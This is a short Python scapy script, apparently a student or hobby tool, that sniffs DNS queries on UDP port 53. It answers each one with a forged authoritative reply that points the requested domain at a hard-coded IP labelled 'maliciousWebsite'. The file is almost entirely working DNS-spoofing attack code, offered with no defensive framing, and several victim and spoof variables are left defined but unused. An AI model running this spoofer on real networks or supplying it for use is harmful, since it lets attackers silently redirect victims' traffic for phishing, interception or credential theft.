import scapy.all as sc

# Author:
# Stan van den Boogaart


maliciousWebsite = "131.155.10.135"



def dnsSpoofer(packet):
   if packet.haslayer(sc.DNS) and packet.getlayer(sc.DNS).qr == 0:
      print(f"\nspoofable lpacket recieved")
      qname = packet[sc.DNSQR].qname.decode()
      print(f"\npacket recieved: {qname}")
      reply_packet = sc.IP(dst=packet[sc.IP].src, src=packet[sc.IP].dst) / \
                      sc.UDP(dport=packet[sc.UDP].sport, sport=53) / \
                      sc.DNS(id=packet[sc.DNS].id, qr=1, aa=1, qd=packet[sc.DNS].qd,
                          an=sc.DNSRR(rrname=packet[sc.DNS].qd.qname, ttl=10, rdata=maliciousWebsite))

    
      sc.send(reply_packet, verbose=1)
      print(f"\nsent spoofed packet: {reply_packet}")
      print({packet[sc.IP].src})


victim_ip = "192.168.1.10"
victim_port = 33333
query_name = "example.com."
fake_ip = "1.2.3.4"  # The IP you want to spoof



      


requests = sc.sniff(filter="udp port 53", prn=dnsSpoofer, store=1, timeout=1040)
requests.show()